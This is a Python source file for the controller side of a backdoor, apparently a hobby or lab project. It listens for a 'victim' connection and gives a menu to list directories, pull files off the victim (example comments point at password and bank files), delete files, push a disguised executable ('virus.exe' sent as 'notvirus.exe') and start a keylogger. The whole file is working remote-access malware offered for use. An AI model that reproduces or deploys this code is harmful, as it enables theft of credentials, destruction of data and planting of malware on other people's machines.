import socket
import os
import base64
import random
from string import ascii_lowercase

HOST = "10.0.2.18"
PORT = 1111

server = socket.socket()
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((HOST, PORT))

print('server Started')
print('Listening for Client Connection')
server.listen(1)
conn, client_addr = server.accept()

print(f'{client_addr} Victim connected to the server, Backdoor established\n')

while True:
    command = input(
        'Enter Command: \n 1) Run Scan\n 2) View Working Directory\n 3) View a custom Directory\n 4) Download a File\n 5) Remove a File\n 6) Send a File\n 7) Run Keylogger\n : '
        )
    print("")
    # Run Scan
    if(command == "1"):
        conn.send(command.encode())
        print("\nCommand sent waiting for execution.... \n")
        # get the encoded data
        encoded_data = conn.recv(4096)
	
        # open a file with a random name and insert the decoded data into it
        random_fd = open("".join(random.choices(ascii_lowercase, k = 10)), "w")
        random_fd.write(base64.b64decode(encoded_data).decode("UTF-8"))
        random_fd.close()
        print("\nFile has been saved\n")

    #View Working Directory
    if(command == "2"):
        conn.send(command.encode())
        print("\nCommand sent waiting for execution.... \n")
        files = conn.recv(5000)
        files = files.decode()
        print("Command output : ", files)
    #View Custom Directory
    elif command == "3": #/home/
        conn.send(command.encode())
        user_input = input(str("\nCustom Dir: "))
        conn.send(user_input.encode())
        print("\nCommand has been sent\n")
        files = conn.recv(5000)
        files = files.decode()
        print("Custom Dir Result : ", files)
    #Download a File
    elif command == "4":    #/home/matt/Documents/passwords.txt
        conn.send(command.encode())
        filepath = input(str("\nPlease enter the file path: "))
        conn.send(filepath.encode())
        file = conn.recv(100000)
        filename = input(str("Please enter a filename for the incoming file including: "))
        new_file = open(filename, "wb")
        new_file.write(file)
        new_file.close()
        print("")
        print(filename, " Has been downloaded and saved\n")
    # Remove a file
    elif command == "5": # /home/matt/Documents/PASSWORDS/bank_pass.txt
        conn.send(command.encode())
        fileanddir = input(str("Please enter the filename and directory: "))
        conn.send(fileanddir.encode())
        print("\nCommand has been executed successfully : File Removed")
    # Send a file
    elif command == "6":
        conn.send(command.encode())
        file = input(str("Please enter filename and directory of the file: "))  # /home/matt/Documents/virus.exe
        filename = input(str("Please enter the filename for the file being sent: "))   #notvirus.exe
        data = open(file, "rb")
        file_data = data.read(7000)
        conn.send(filename.encode())
        print(file, "Has been sent successfully")
        conn.send(file_data)
    # Run Keylogger
    elif command == "7":
        conn.send(command.encode())
    else:
        print("\nCommand not recognized")
